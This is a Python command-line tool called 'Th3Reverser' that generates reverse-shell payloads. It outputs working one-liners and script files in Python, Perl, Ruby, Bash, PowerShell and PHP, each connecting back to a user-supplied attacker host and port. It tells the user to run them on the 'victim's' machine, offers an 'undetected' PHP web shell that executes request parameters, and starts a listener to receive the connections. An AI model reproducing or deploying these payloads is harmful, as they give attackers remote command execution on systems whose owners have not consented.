#!/usr/bin/python3

import os
import platform
import nclib
from colorama import Fore, Back, Style, init

def listening_option():
  listening = input("[+] Do you want to start listening [Y/n]: ")
  if listening.lower() == "y":
    print("""                                                
        .-///:-`                           
    `/ymhso++oydms:                        
   +mh/`./+oo+:``+dd/                      
 `hm: /dds/:/+smh: +Ns                     
 hm.`hm/       `oNo /No      `o+           
.Ns +No`         sN- dm    `: :mh.         
`-` /sydds-      +N/ hN` ` /mh``dm.        
        .sNs    .md`.mh .my`.md`.mh        
          /N+  `dm.`dm.  -Ns /N+ sN.       
           Nh `hm- hm-    dm .Ns +N:       
          /N+ yN- yN:    -Ny /N+ sN.       
        .sNs sN: sN/    .my`.md`.mh        
     +ydds- oN/ oN+      ` /mh``dm.        
     .-`   -d+ +No         `: :mh.         
`/.           /Ns            `o+           
`mh          :Ny                           
 :mh-      `+Ny                            
  .omdso+oymy:                             
     .://:-`

[+] Listening for any connections:  
[!] NOTE: TYPE SOME COMMANDS AND WHEN A REVERSE SHELL CONNECTION IS ETABLISHED THEY WILL BE EXECUTED.
""")
    os.system("echo [!] nclib doesn't work on Windows [!] && exit" if platform.system() == "Windows" else "python3 -c 'import nclib; nclib.Netcat(listen=("+Port+")).interact();'")
    exit()
  elif listening.lower() == "n":
    print(Fore.WHITE+Back.RED+"[-] OK, GOOD-BYE [-]"+Style.RESET_ALL)
    exit()
  else:
    print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
    listening_option()

def Th3Reverser_Banner():
   os.system("cls" if platform.system() == "Windows" else "clear")
   print(""":::::::::::::::::::::::::::::::::::::::::::
:::::	     *-* Th3Reverser *-*      :::::
::::	*-*  A Reverse Shell Tool *-*  ::::
:::	 *-* Coded By Iyed Mejri *-*	:::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::
""")
   print("""+---------------+----------+---------------+
| Option Number | Payloads | 	 System      |
+---------------+----------+---------------+""")
   print(Fore.YELLOW+"|       1	|  Python  | Windows/Linux |"+Style.RESET_ALL)
   print(Fore.YELLOW+"+---------------+----------+---------------+"+Style.RESET_ALL)
   print(Fore.CYAN+"|	2	|   Perl   | Windows/Linux |"+Style.RESET_ALL)
   print(Fore.CYAN+"+---------------+----------+---------------+"+Style.RESET_ALL)
   print(Fore.RED+"|	3	|   Ruby   | Windows/Linux |"+Style.RESET_ALL)
   print(Fore.RED+"+---------------+----------+---------------+"+Style.RESET_ALL)
   print(Fore.WHITE+"|	4	|   Bash   |	 Linux	   |"+Style.RESET_ALL)
   print(Fore.WHITE+"+---------------+----------+---------------+"+Style.RESET_ALL)
   print(Fore.BLUE+"|	5	|PowerShell|	Windows	   |"+Style.RESET_ALL)
   print(Fore.BLUE+"+---------------+----------+---------------+"+Style.RESET_ALL)
   print(Fore.BLUE+"|	6	|   PHP    | Windows Server|"+Style.RESET_ALL)
   print(Fore.BLUE+"|		|          | Linux Server  |"+Style.RESET_ALL)
   print(Fore.BLUE+"+---------------+----------+---------------+"+Style.RESET_ALL)
   def Th3Reverser():
    options = input("\nChoose your option: ")
    if options == "1":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.YELLOW+"""
                      --    ./`
                      .-   :y.
                      so   :y.
`///:/o/` `o:    :o` :ss:- :y////o/`  -+///+:  `:/::/o+`
:y`   `s+ `y/    :s.  so   :y-   .y/ :y.   `so -y-   `s/
:y`    os``y/    :s.  so   :y.    y/ os     +y`-y-    s/
:y`   `so `y/    :s.  oo   :y.    y/ /y.    oo -y-    s/
:y//:/o/`  :o+::/os.  :o:. :s.    s/  :+/:/+/` -s-    s/
:s` ``           :s`                     `
:y`           `.:o:
`-`          `:-.	    # Python Reverse Shell #

+---------------+---------+
| Option Number | System  |
|               |         |
+---------------+---------+
|       1       | Linux   |
+---------------+---------+
""")
     def python_option():
       system_python = input(Fore.YELLOW+"[+] Choose the system you're trying to get reverse shell on: ")
       if system_python == "1":
        os.system("cls" if platform.system() == "Windows" else "clear")
        print("""
:::::::::::::::::::::::::::::::::::::::::::
:::::        *-* Th3Reverser *-*      :::::
::::    *-*  A Reverse Shell Tool *-*  ::::
:::      *-* Coded By Iyed Mejri *-*    :::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
    """)
        def Payload_Option_Python():
          Payload_Type_Python_Linux = input(Fore.YELLOW+"[+] Choose the Payload Type: ")
          if Payload_Type_Python_Linux == "1":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           global Port
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           print("[+] Enter this command on the victim's Terminal [+]")
           print('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+Host+'''",'''+Port+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''')
           listening_option()
          elif Payload_Type_Python_Linux == "2":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           File = input("[+] Enter the path for the payload: ")
           f = open(File, "w+")
           S0 = """#!/usr/bin/python3
import os
import subprocess
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('"""
           S1 = Host
           S2 = "',"
           S3 = Port
           S4 = "))"
           S5 = """os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(['/bin/sh', '-i'])"""
           f.write('{0}{1}{2}{3}{4}\n{5}'.format(S0, S1, S2, S3, S4, S5))
           f.close()
           print("[+] Reverse Shell has been generated")
           listening_option()
          else:
           print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
           Payload_Option_Python()
        Payload_Option_Python()
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        python_option()
     python_option()
    elif options == "2":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.CYAN+"""
::::::::--.                                 .ssso
yyyyyyyyyyyyo:                              .yyys
yyys:::::+syyyo`      ```                `` .yyys
yyyo       +yyy:  `/syyyyys+.    syyy./oyyy .yyys
yyyo       /yyy/ /yyys+//oyyy+`  syyyyyysoo .yyys
yyyo.....-oyyyy`/yyy:     .yyy+  syyyy:`    .yyys
yyyyyyyyyyyyy+` yyyyoooooooyyyy` syyy-      .yyys
yyys+++++/:-`   yyyy+++++++++++` syyy`      .yyys
yyyo            :yyy/`     .-    syyy`      .yyys
yyyo             :yyyyo++oyyys`  syyy`      .yyys
sss/               -+syyyys+:`   osss`      .ssso

   	       # Perl Reverse Shell #

+---------------+---------+
| Option Number | System  |
|               |         |
+---------------+---------+
|       1       | Windows |
+---------------+---------+
|       2       | Linux   |
+---------------+---------+
  """)
     def perl_option():
       system_perl = input(Fore.CYAN+"[+] Choose the system you're trying to get reverse shell on: ")
       if system_perl == "1":
        os.system("cls" if platform.system() == "Windows" else "clear")
        print("""
:::::::::::::::::::::::::::::::::::::::::::
:::::        *-* Th3Reverser *-*      :::::
::::    *-*  A Reverse Shell Tool *-*  ::::
:::      *-* Coded By Iyed Mejri *-*    :::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
""")
        def Payload_Option_Perl_Windows():
          Payload_Type_Perl_Windows = input(Fore.CYAN+"[+] Choose the Payload Type: ")
          if Payload_Type_Perl_Windows == "1":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           global Port
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           print("[+] Enter this command on the victim's CMD [+]")
           print("""perl -e "use Socket;$i='"""+Host+"';$p="+Port+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('cmd.exe');};" ''')
           listening_option()
          elif Payload_Type_Perl_Windows == "2":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           File = input("[+] Enter the path for the payload: ")
           f = open(File, "w+")
           S0 = """use Socket;
$i='"""
           S1 = Host
           S2 = """';
$p="""
           S3 = Port
           S4 = """;
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,'>&S');
open(STDOUT,'>&S');
open(STDERR,'>&S');
exec('cmd.exe');
};"""
           f.write('{0}{1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
           f.close()
           print("[+] Reverse shell has been generated")
           listening_option()
          else:
           print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
           Payload_Option_Perl_Windows()
        Payload_Option_Perl_Windows()   
       elif system_perl == "2":
        os.system("cls" if platform.system() == "Windows" else "clear")
        print(Fore.CYAN+"""
:::::::::::::::::::::::::::::::::::::::::::
:::::        *-* Th3Reverser *-*      :::::
::::    *-*  A Reverse Shell Tool *-*  ::::
:::      *-* Coded By Iyed Mejri *-*    :::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
""")
        def Payload_Option_Perl_Linux():
          Payload_Type_Perl_Linux = input(Fore.CYAN+"[+] Choose the Payload Type: ")
          if Payload_Type_Perl_Linux == "1":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           global Port
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           print("[+] Enter this command on the victim's Terminal [+]")
           print('''perl -e 'use Socket;$i="'''+Host+'";$p='+Port+''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''')
           listening_option()
          elif Payload_Type_Perl_Linux == "2":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           File = input("[+] Enter the path for the payload: ")
           f = open(File, "w+")
           S0 = """#!/usr/bin/perl
use Socket;
$i='"""
           S1 = Host
           S2 = """';
$p="""
           S3 = Port
           S4 = """;
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,'>&S');
open(STDOUT,'>&S');
open(STDERR,'>&S');
exec('/bin/sh -i');
};"""
           f.write('{0}{1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
           f.close()
           print("[+] Reverse shell has been generated")
           listening_option()
          else:
           print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
           Payload_Option_Perl_Linux()
        Payload_Option_Perl_Linux()   
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        perl_option()
     perl_option() 
    elif options == "3":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.RED+"""
                          ::::
ooo++++/:    	          :/s:
yMm::/+mNy:	          :Mm:
oMm    sMM:   ////  :///  :Mm//+o/:  ////:  :///-
oMm::/+ddo   /sMh  :+NM:  :MNo++odms  /sMm/  /hh+
oMmoomNo      /Mh   :mM:  :Mm:   :mM+   yMy  /y:
oMm  /hNy:    /Mh   :mM:  :Mm:    dMo   :hMo/y:
sMm:  :oNmo:  :Mm: :/mM/  :MN/   +Nh:    :dMh:
yhyso   /yyso  +hhs+/sy    hosooos/:      /m/
       			  	         /y/
  	   # Ruby Reverse Shell #

+---------------+---------+
| Option Number | System  |
|               |         |
+---------------+---------+
|       1       | Windows |
+---------------+---------+
|       2       | Linux   |
+---------------+---------+
""")
     def ruby_option():
       system_ruby = input(Fore.RED+"[+] Choose the system you're trying to get reverse shell on: ")
       if system_ruby == "1":
        os.system("cls" if platform.system() == "Windows" else "clear")
        print("""
:::::::::::::::::::::::::::::::::::::::::::
:::::        *-* Th3Reverser *-*      :::::
::::    *-*  A Reverse Shell Tool *-*  ::::
:::      *-* Coded By Iyed Mejri *-*    :::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       |    Script    |
+---------------+--------------+
""")
        def Payload_Option_Ruby_Windows():
          Payload_Type_Ruby_Windows = input(Fore.RED+"[+] Choose the Payload Type: ")
          if Payload_Type_Ruby_Windows == "1":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           global Port
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           File = input("[+] Enter the path for the payload: ")
           f = open(File, "w+")
           S0 = """require 'socket'
c=TCPSocket.new('"""
           S1 = Host
           S2 = """','"""
           S3 = Port
           S4 = """')
while(cmd=c.gets)
IO.popen(cmd,"r"){|io|c.print io.read}end"""
           f.write('{0}{1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
           f.close()
           print("[+] Reverse shell has been generated")
           listening_option()
          else:
           print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
           Payload_Option_Ruby_Windows()
        Payload_Option_Ruby_Windows()
       elif system_ruby == "2":
        os.system("cls" if platform.system() == "Windows" else "clear")
        print(Fore.RED+"""
:::::::::::::::::::::::::::::::::::::::::::
:::::        *-* Th3Reverser *-*      :::::
::::    *-*  A Reverse Shell Tool *-*  ::::
:::      *-* Coded By Iyed Mejri *-*    :::
::   *-* Instagram: @EL_Psyc0p4the *-*   ::
:::::::::::::::::::::::::::::::::::::::::::

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
""")
        def Payload_Option_Ruby_Linux():
          Payload_Type_Ruby_Linux = input(Fore.RED+"[+] Choose the Payload Type: ")
          if Payload_Type_Ruby_Linux == "1":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           global Port
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           print("[+] Enter this command on the victim's Terminal [+]")
           print("""ruby -rsocket -e "exit if fork;c=TCPSocket.new('"""+Host+"','"+Port+'''');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"''')
           listening_option()
          elif Payload_Type_Ruby_Linux == "2":
           Host = input("[+] Enter your LHOST: ")
           print("[!] LHOST ==>", Host)
           Port = input("[+] Enter your LPORT: ")
           print("[!] LPORT ==>", Port)
           File = input("[+] Enter the path for the payload: ")
           f = open(File, "w+")
           S0 = """#!/usr/bin/env ruby
require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in"""
           S1 = Port
           S2 = ", '"
           S3 = Host
           S4 = """'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'"""
           f.write('{0} {1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
           f.close()
           print("[+] Reverse shell has been generated")
           listening_option()
          else:
           print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
           Payload_Option_Ruby_Linux()
        Payload_Option_Ruby_Linux()   
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        ruby_option()
     ruby_option()   
    elif options == "4":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.WHITE+"""
  .....`        `.`        ..-.    `.`    `..
:hhhhhhho.     yhh-    `ohhyyhho. ohh    +hh`
:hh:  `yhh    +hhhy`   shh.  `shh ohh    +hh`
:hhs++shh:   -hh/yho   -yhyo/:.   ohh++++shh`
:hho//+yho` `yhy:ohh:    .:+shhy: ohh++++shh`
:hh:   /hh- shhsssyhh``yy+    shh`ohh    +hh`
:hhyssyhh/ /hh-   `yhs :yhyooyhh/ ohh    +hh`
`:::::-.   -:-     .:-   .-:::.   .:-    .:-

  	   # BASH Reverse Shell #

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
""")
     def bash_option():
       Payload_Type_BASH = input(Fore.WHITE+"[+] Choose the Payload Type: ")
       if Payload_Type_BASH == "1":
        Host = input("[+] Enter your LHOST: ")
        print("[!] LHOST ==>", Host)
        global Port
        Port = input("[+] Enter your LPORT: ")
        print("[!] LPORT ==>", Port)
        print("[+] Enter this command on the victim's Terminal [+]")
        print('bash -i >& /dev/tcp/'+Host+'/'+Port+' 0>&1')
        listening_option()
       elif Payload_Type_BASH == "2":
        Host = input("[+] Enter your LHOST: ")
        print("[!] LHOST ==>", Host)
        Port = input("[+] Enter your LPORT: ")
        print("[!] LPORT ==>", Port)
        File = input("[+] Enter the path for the payload: ")
        f = open(File, "w+")
        S0 = "bash -i >& /dev/tcp/"
        S1 = Host
        S2 = "/"
        S3 = Port
        S4 = "0>&1"
        f.write('{0}{1}{2}{3} {4}'.format(S0, S1, S2, S3, S4))
        f.close()
        print("[+] Reverse shell has been generated")
        listening_option()
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        bash_option()
     bash_option()   
    elif options == "5":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.BLUE+"""
/hyyyys/`
od-```:dd.
od-    /M+ `-osyys+`  o+`   /s-   .s-  .+syys:`  -y:/so`
od-  `-dh.`hd:`  .sm: /m:  .hhh`  oh. /m+`  -ms` :Md:``
oNmddys/` /m:     `dy``yy``os.d+ -m/ .mdooooohd. :M+
od-       +m:     `my` :m/:h- +h.yy` .Ny-        :M/
od-       `hd/```-sd-   sdh+  .hym.   +m+        :M/
/o.        `:ossso:`    .so`   :s/     -+ssss/`  -y/
   ```.``   .:`                    -:`  -:
 .osssyys:  /N:                    sd. `hm
`sm-    ``  /N:`.--.      `.-..    sd. `hN
 /ds:.`     /Ns+//ohs   -ss+/+ys`  sd. `hN
  `:osyo:`  /N+`   oN- `mh:...:Ns  sd. `hN
     `./dy` /N:    /N: -Ny+++++o/  sd. `hN
 -.    -hd` /N:    /N: `dh-    `   sd. `hN
`/syssys+.  :h-    :h-  .+ssoos/`  +y. `sh

         # PowereShell Reverse Shell #

+---------------+--------------+
| Option Number | Payload Type |
|               |              |
+---------------+--------------+
|       1       | Command Line |
+---------------+--------------+
|       2       |    Script    |
+---------------+--------------+
""")
     def powershell_option():
       Payload_Type_PowerShell = input(Fore.BLUE+"[+] Choose the Payload Type: ")
       if Payload_Type_PowerShell == "1":
        Host = input("[+] Enter your LHOST: ")
        print("[!] LHOST ==>", Host)
        global Port
        Port = input("[+] Enter your LPORT: ")
        print("[!] LPORT ==>", Port)
        print("[+] Enter this command on the victim's PowerShell [+]")
        print('$client = New-Object System.Net.Sockets.TCPClient("'+Host+'",'+Port+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
        listening_option()
       elif Payload_Type_PowerShell == "2":
        Host = input("[+] Enter your LHOST: ")
        print("[!] LHOST ==>", Host)
        Port = input("[+] Enter your LPORT: ")
        print("[!] LPORT ==>", Port)
        File = input("[+] Enter the path for the payload: ")
        f = open(File, "w+")
        S0 = """function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$address = '"""
        S1 = Host
        S2 = """'
$port = '"""
        S3 = Port
        S4 = """'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}"""
        f.write('{0}{1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
        f.close()
        print("[+] Reverse Shell has been generated")
        listening_option()
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        powershell_option()
     powershell_option()   
    elif options == "6":
     os.system("cls" if platform.system() == "Windows" else "clear")
     print(Fore.BLUE+"""
                     +ddh`
                   `NMMy
   `::::::::-.`    /MMMo::::-.     :::::::::-`
   sMMMNNNNMMMd/   dMMMNNNNMMNh.  .MMMNNNNMMMNy`
  `NMMh----:dMMM: -MMMo----yMMM/  sMMM:---:oMMMh
  /MMM:     +MMM+ yMMN`    sMMM. `NMMh     `MMMd
  dMMm     `dMMN.`NMMs    `NMMh  /MMM:     +MMM+
 -MMMs..--/hMMm: oMMM.    +MMM:  dMMN...-:sNMMs
 yMMMNNNNNMMdo`  mMMh     dMMm  -MMMMNNNNMMNy-
`NMMh////:-.`   `///-    `///-  yMMN/////:.`
+MMM-                          `NMMy
yddy   # PHP Reverse Shell #   :ddd-

+---------------+-------------------+
| Option Number |   Payload Type    |
+---------------+-------------------+
|       1       | Undettected Shell |
+---------------+-------------------+
|       2       |   Reverse Shell   |
+---------------+-------------------+
""")
     def php_option():
       Payload_Type_PHP = input(Fore.BLUE+"[+] Choose the Payload Type: ")
       if Payload_Type_PHP == "1":
        File = input("[+] Enter the name of the reverse shell you want: ")
        f = open(File, "w+")
        S0 = "<html><body><h1><pre>Th3Reverser<br><br><?php if(isset($_REQUEST['cmd'])){$cmd = ($_REQUEST['cmd']);system($cmd);} __halt_compiler();?></pre></h1></body></html>"
        f.write('{0}'.format(S0))
        f.close()
        print("[+] Shell has been generated")
        print("[+] Usage : http(s)://www.target.com/example.php?cmd=ls")
        exit()
       elif Payload_Type_PHP == "2":
        Host = input("[+] Enter your LHOST: ")
        print("[!] LHOST ==>", Host)
        global Port
        Port = input("[+] Enter your LPORT: ")
        print("[!] LPORT ==>", Port)
        File = input("[+] Enter the path for the payload: ")
        f = open(File, "w+")
        S0 = """<?php
set_time_limit (0);
$ip = '"""
        S1 = Host
        S2 = """';
$port = """
        S3 = Port
        S4 = """;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
$pid = pcntl_fork();
if ($pid == -1) {
	printit("ERROR: Can't fork");
	exit(1);
}
if ($pid) {
exit(0);
}
if (posix_setsid() == -1) {
	printit("Error: Can't setsid()");
	exit(1);
}
$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
    		if ($debug) printit("SOCK: $input");
    		fwrite($pipes[0], $input);
    	}
    	if (in_array($pipes[1], $read_a)) {
    		if ($debug) printit("STDOUT READ");
    		$input = fread($pipes[1], $chunk_size);
    		if ($debug) printit("STDOUT: $input");
    		fwrite($sock, $input);
    	}
    	if (in_array($pipes[2], $read_a)) {
    		if ($debug) printit("STDERR READ");
    		$input = fread($pipes[2], $chunk_size);
    		if ($debug) printit("STDERR: $input");
    		fwrite($sock, $input);
    	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>"""
        f.write('{0}{1}{2}{3}{4}'.format(S0, S1, S2, S3, S4))
        f.close()
        print("[+] Reverse shell has been generated")
        listening_option()
       else:
        print(Fore.WHITE+Back.RED+"[!] Please enter a valid option [!]"+Style.RESET_ALL)
        php_option()
     php_option()   
    else:
     print(Fore.WHITE+Back.RED+"[!] Please choose a valid option [!]"+Style.RESET_ALL)
     Th3Reverser()
   Th3Reverser()
if platform.system() == "Linux":
  Th3Reverser_Banner()
elif platform.system() == "Windows":
 init(convert=True)
 Th3Reverser_Banner()
elif platform.system() == "Unix":
 Th3Reverser_Banner()
else:
 print(Fore.WHITE+Back.RED+"[!] Failed to detect the operating system [!]"+Style.RESET_ALL)
 exit()
